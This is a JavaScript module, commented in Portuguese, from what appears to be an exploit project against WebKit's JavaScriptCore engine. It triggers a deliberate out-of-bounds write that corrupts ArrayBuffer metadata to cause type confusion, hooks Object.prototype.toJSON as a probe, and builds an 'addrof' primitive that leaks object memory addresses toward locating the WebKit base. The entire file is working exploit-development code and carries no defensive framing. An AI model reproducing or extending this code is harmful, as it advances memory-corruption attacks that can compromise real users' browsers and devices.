// js/script3/testArrayBufferVictimCrash.mjs (v114 - Lógica de Gatilho Corrigida)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - CORRIGIDO: O erro `TypeError: Cannot read properties of undefined (reading 'sub')` foi
//   resolvido. A causa era uma implementação 'addrof' incompleta que não acionava a
//   vulnerabilidade de Type Confusion subjacente.
// - REINTRODUZIDO: A lógica de "Heisenbug" (uma escrita OOB crítica) agora é chamada
//   explicitamente antes de tentar o 'addrof', espelhando um exploit real.
// - MELHORADO: A rotina de diagnóstico agora usa a técnica correta de confusão de tipo
//   em um ArrayBuffer vítima, em vez de um array de floats simples.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, PAUSE } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    oob_write_absolute, // Importação necessária para o gatilho
    arb_read,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v114_TriggerFix";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// #NOVO: Função para acionar a vulnerabilidade de Type Confusion (Heisenbug).
// Esta etapa estava faltando e é a causa da falha anterior.
async function triggerHeisenbugForAddrof() {
    const FNAME_TRIGGER = "triggerHeisenbugForAddrof";
    logS3(`--- Acionando gatilho de Type Confusion (Heisenbug)... ---`, "info", FNAME_TRIGGER);

    // #REASONING: Estes são os parâmetros da vulnerabilidade de TC, baseados em 'core_exploit.mjs'.
    // A escrita OOB corrompe metadados que levam o JSC a confundir o tipo de um ArrayBuffer.
    const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = 0x58;
    const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
    const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET;
    const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;

    try {
        if (!isOOBReady()) {
            await triggerOOB_primitive({ force_reinit: true });
        }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(50); // Pausa para garantir que a corrupção seja processada.
        logS3("Gatilho de Type Confusion acionado com sucesso.", "good", FNAME_TRIGGER);
        return true;
    } catch (e) {
        logS3(`Falha ao acionar o gatilho de TC: ${e.message}`, 'critical', FNAME_TRIGGER);
        return false;
    }
}

// #CORRIGIDO: A função de diagnóstico agora usa a lógica de addrof correta.
async function runAddrofDiagnostics() {
    const FNAME_DIAG = "AddrofDiagnostics";
    logS3(`--- Iniciando Diagnóstico da Primitiva 'addrof' (v114) ---`, "subtest", FNAME_DIAG);

    // Aciona a vulnerabilidade UMA VEZ.
    if (!await triggerHeisenbugForAddrof()) {
        throw new Error("Não foi possível acionar a vulnerabilidade base para o addrof.");
    }

    const test_targets = {
        'JS_Object': {},
        'JS_Array': [1, 2, 3],
        'JS_Function': function() {},
        'DOM_DivElement': document.createElement('div'),
    };
    const nan_boxing_offsets = [0x0001, 0x0002, 0x1000, 0x2000, 0x4000];
    
    // Sonda para a confusão de tipo
    let target_for_probe = null;
    const toJSON_Probe = function() {
        if (target_for_probe) {
            try { this[0] = target_for_probe; } catch (e) { /* ignore */ }
        }
        return {};
    };

    const originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_Probe, writable: true, configurable: true });

    for (const target_name in test_targets) {
        target_for_probe = test_targets[target_name];
        logS3(`--- Testando Alvo: ${target_name} ---`, 'info', FNAME_DIAG);

        // #FIX: A cada teste, um novo ArrayBuffer vítima é criado.
        // É este buffer que sofrerá a Type Confusion.
        const victim_ab = new ArrayBuffer(64); 
        const float_view = new Float64Array(victim_ab);
        float_view.fill(13.37); // Preenche com um valor conhecido.

        // Usa JSON.stringify para acionar a sonda 'toJSON' no objeto com tipo confundido.
        JSON.stringify(victim_ab);

        const value_as_double = float_view[0];
        if (value_as_double === 13.37) {
            logS3(`  -> FALHA: O valor do buffer não foi sobrescrito para o alvo '${target_name}'. A TC pode não ter funcionado.`, 'error', FNAME_DIAG);
            continue;
        }

        const value_as_int64 = doubleToInt64(value_as_double);

        for (const offset_val of nan_boxing_offsets) {
            const current_offset = new AdvancedInt64(0, offset_val);
            const leaked_addr = value_as_int64.sub(current_offset);
            const log_msg = `  -> Offset 0x${offset_val.toString(16)}: Endereço vazado = ${toHex(leaked_addr)}`;
            
            if (leaked_addr.low() !== 0 || leaked_addr.high() !== 0x7ff7ffff) {
                logS3(log_msg + " [POTENCIALMENTE VÁLIDO!]", 'vuln', FNAME_DIAG);
            } else {
                logS3(log_msg, 'leak', FNAME_DIAG);
            }
        }
    }

    if (originalToJSON) {
        Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
    }
    logS3(`--- Diagnóstico 'addrof' concluído. ---`, "subtest", FNAME_DIAG);
}


export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Lógica de Gatilho Corrigida ---`, "test");

    let final_result = { success: false, message: "Diagnóstico não produziu um vazamento.", webkit_base: null };

    try {
        logS3("--- ETAPA 1/2: Validando primitivas de Leitura/Escrita... ---", "subtest");
        if (!await selfTestOOBReadWrite(logS3)) {
            throw new Error("Autoteste de L/E FALHOU. Primitivas base estão quebradas.");
        }
        logS3("Primitivas de L/E estão operacionais.", "good");

        logS3("--- ETAPA 2/2: Executando diagnóstico de 'addrof' com gatilho... ---", "subtest");
        await runAddrofDiagnostics();
        
        final_result.message = "Diagnóstico concluído. Analise os logs para encontrar um endereço potencialmente válido e um offset de NaN-boxing.";
        
    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
